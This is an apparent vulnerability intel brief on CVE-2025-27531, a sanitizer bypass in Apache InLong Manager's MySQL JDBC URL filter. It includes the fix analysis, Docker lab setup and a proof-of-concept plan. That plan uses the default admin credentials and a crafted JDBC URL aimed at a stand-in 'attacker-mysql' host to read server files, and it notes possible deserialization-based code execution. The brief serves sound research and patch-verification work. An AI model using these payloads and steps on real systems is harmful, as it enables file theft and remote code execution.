# Intel Brief: CVE-2025-27531

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-27531 |
| **Affected Software** | Apache InLong (inlong-manager component) |
| **Vendor** | Apache Software Foundation |
| **Affected Versions** | 1.13.0 ≤ version < 2.1.0 |
| **CVSS Score** | 9.8 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **EPSS** | 0.5% (65th percentile) |
| **Published** | 2025-06-06 |

## Description

Apache InLong Manager's JDBC URL sanitization logic (`MySQLSensitiveUrlUtils.filterSensitive()`) can be bypassed using a "double writing" technique. The vulnerable code uses a single-pass `for` loop to remove dangerous MySQL JDBC connection parameters (`autoDeserialize`, `allowLoadLocalInfile`, `allowUrlInLocalInfile`). An authenticated attacker can craft a JDBC URL that embeds a sensitive parameter name *within itself*, so that after the sanitizer removes the inner occurrence, the outer fragments concatenate to re-form the dangerous parameter.

### Vulnerability Mechanism

The vulnerable code (v2.0.0) in `MySQLSensitiveUrlUtils.java` lines 74-78:
```java
for (String key : SENSITIVE_REPLACE_PARAM_MAP.keySet()) {
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, key + "=" + "true", "");
    resultUrl = StringUtils.replaceIgnoreCase(resultUrl, key + "=" + "yes", "");
}
```

**Attack example** (from the fix's test case):
```
Input:  jdbc:mysql://address=(host=127.0.0.1)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)
Step 1: Sanitizer removes inner "allowLoadLocalInfile=true" → "allowLoadLocalInfile=true" remains
Result: jdbc:mysql://address=(host=127.0.0.1)(port=3306)(allowLoadLocalInfile=true)
```

The sanitizer only makes one pass per key, so the reconstituted parameter survives. With `allowLoadLocalInfile=true`, an attacker can read arbitrary files from the InLong server via MySQL's `LOAD DATA LOCAL INFILE`. With `autoDeserialize=true`, Java deserialization attacks are possible via a malicious MySQL server.

### Impact
- **Arbitrary file read** via `allowLoadLocalInfile=true` bypass → MySQL `LOAD DATA LOCAL INFILE`
- **Remote code execution** via `autoDeserialize=true` bypass → Java deserialization through a rogue MySQL server
- **Authentication required**: Yes — the attacker must be an authenticated InLong user (default creds: `admin`/`inlong`)

## Repository Information

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/apache/inlong.git |
| **Vulnerable Version** | `2.0.0-RC0` (tag checked out, version 2.0.0) |
| **Fix Commit (branch-2.1)** | `ebcd6d3230b73abdc41edb93619be2a26c9b8c97` — changes `for` loop to `while` loop with iterative sensitive key detection |
| **Fix Commit (master)** | `86c893cfd8f7ba9ffce5d20abef6cd360f502fdf` — additionally fixes case-sensitivity bypass in `containSensitiveKey()` |
| **Patched Version** | 2.1.0 (tag `2.1.0-RC0`) |
| **Fix PR** | https://github.com/apache/inlong/pull/11586 |
| **Fix Issue** | https://github.com/apache/inlong/issues/11585 |

## Fix Analysis

The fix involves two changes:

### Fix 1: Double-write bypass (ebcd6d3, in 2.1.0)
- Changed single-pass `for` loop to a `while` loop that keeps removing sensitive params until none remain
- Added `containSensitiveKey()` method that checks if any sensitive key still exists in the URL
- This prevents the double-writing bypass where nested param names survive a single sanitization pass

### Fix 2: Case-sensitivity bypass (86c893c, in master post-2.1.0)
- Changed `String.contains()` to `StringUtils.containsIgnoreCase()` in `containSensitiveKey()`
- Prevents bypasses using mixed-case values (e.g., `TRUE`, `True`, Unicode long-s `yeſ`)

## Build System

| Field | Value |
|---|---|
| **Build Tool** | Apache Maven |
| **Java Version** | 1.8 (Java 8) |
| **Spring Boot** | 2.6.15 |
| **Project Version** | 2.0.0 |
| **Relevant Module** | `inlong-manager/manager-pojo` (contains vulnerable `MySQLSensitiveUrlUtils`) |
| **Web Module** | `inlong-manager/manager-web` (REST API, port 8083) |
| **Auth Framework** | Apache Shiro 1.13.0 |

## Key Dependencies
- `org.apache.commons:commons-lang3` — provides `StringUtils.replaceIgnoreCase()`, the actual string replacement function
- `org.apache.shiro:shiro-spring` 1.13.0 — authentication
- `mysql-connector-java` — MySQL JDBC driver (test scope, but relevant to exploitation)
- `spring-boot-starter-web` 2.6.15 — web framework

## Docker Deployment

Pre-built Docker images are available on Docker Hub:
- **Vulnerable**: `inlong/manager:2.0.0` (confirmed available)
- **Patched**: `inlong/manager:2.1.0` (not on Hub, but `2.2.0` is available)
- **Full stack compose**: Available at `docker/docker-compose/docker-compose.yml`

### Key Docker services needed:
- `mysql:8.0.28` — Backend database (port 3306, password: `inlong`)
- `inlong/manager:2.0.0` — Vulnerable manager (port 8083)
- Optional: `inlong/dashboard:2.0.0` — Web UI (port 80)

### Default Credentials
- **InLong Manager**: `admin` / `inlong`
- **MySQL**: `root` / `inlong`
- **Login endpoint**: `POST /api/anno/login` with JSON `{"username":"admin","password":"inlong"}`

## Vulnerable Code Path

1. **Entry point**: `POST /api/sink/save` (authenticated, requires valid session)
2. **Request processing**: `StreamSinkController.save()` → `StreamSinkService.save()`
3. **DTO conversion**: `MySQLSinkDTO.getFromRequest()` calls `filterSensitive(request.getJdbcUrl())`
4. **Vulnerable filter**: `MySQLSensitiveUrlUtils.filterSensitive()` — single-pass sanitization
5. **Stored result**: Sanitized URL stored in database, but attacker's malicious params survive

Alternative entry points:
- `POST /api/sink/update` — update existing sink
- `POST /api/node/save` — via `MySQLDataNodeDTO.convertToJdbcurl()`

## Sensitive Parameters (the bypass targets)

| Parameter | Effect | Default Safe Value |
|---|---|---|
| `autoDeserialize` | Enables Java deserialization of MySQL result columns | `false` |
| `allowLoadLocalInfile` | Allows reading local files via `LOAD DATA LOCAL INFILE` | `false` |
| `allowUrlInLocalInfile` | Allows loading files from URLs via `LOAD DATA LOCAL INFILE` | `false` |
| `allowLoadLocalInfileInPath` | Restricts local file loading to a path (removed entirely) | (removed) |

## PoC Strategy

### Approach: Bypass JDBC URL sanitization via double-writing

1. **Setup**: Deploy InLong Manager 2.0.0 with MySQL backend using Docker
2. **Authenticate**: Login as `admin`/`inlong` via `POST /api/anno/login`
3. **Exploit**: Create a MySQL sink with a crafted JDBC URL:
   ```
   jdbc:mysql://attacker-mysql:3306/test?allowLoadallowLoadLocalInfile=trueLocalInfile=true
   ```
4. **Verify**: Check that the stored JDBC URL contains `allowLoadLocalInfile=true` after sanitization
5. **Impact demo**: When InLong connects to the attacker-controlled MySQL server, `LOAD DATA LOCAL INFILE` can exfiltrate files

### Simpler unit-test-level PoC:
Call `MySQLSensitiveUrlUtils.filterSensitive()` directly and show the bypass:
```java
String result = MySQLSensitiveUrlUtils.filterSensitive(
    "jdbc:mysql://127.0.0.1:3306/test?allowLoadallowLoadLocalInfile=trueLocalInfile=true"
);
// Expected after proper sanitization: no allowLoadLocalInfile=true
// Actual (vulnerable): contains allowLoadLocalInfile=true
```

## Public Exploits

**No public exploits found.** No Metasploit modules, ExploitDB entries, GitHub PoCs, or Nuclei templates exist for this CVE.

## References

- **GHSA Advisory**: https://github.com/advisories/GHSA-62gc-8jr5-x9pm
- **Apache Mailing List**: https://lists.apache.org/thread/r62lkqrr739wvcb60j6ql6q63rh4bxx5
- **OSS-Security**: http://www.openwall.com/lists/oss-security/2025/02/28/2
- **Fix PR**: https://github.com/apache/inlong/pull/11586
- **Fix Issue**: https://github.com/apache/inlong/issues/11585
- **Fix Commit (2.1.0)**: https://github.com/apache/inlong/commit/ebcd6d3230b73abdc41edb93619be2a26c9b8c97
- **Fix Commit (master)**: https://github.com/apache/inlong/commit/86c893cfd8f7ba9ffce5d20abef6cd360f502fdf
- **NVD**: https://nvd.nist.gov/vuln/detail/CVE-2025-27531
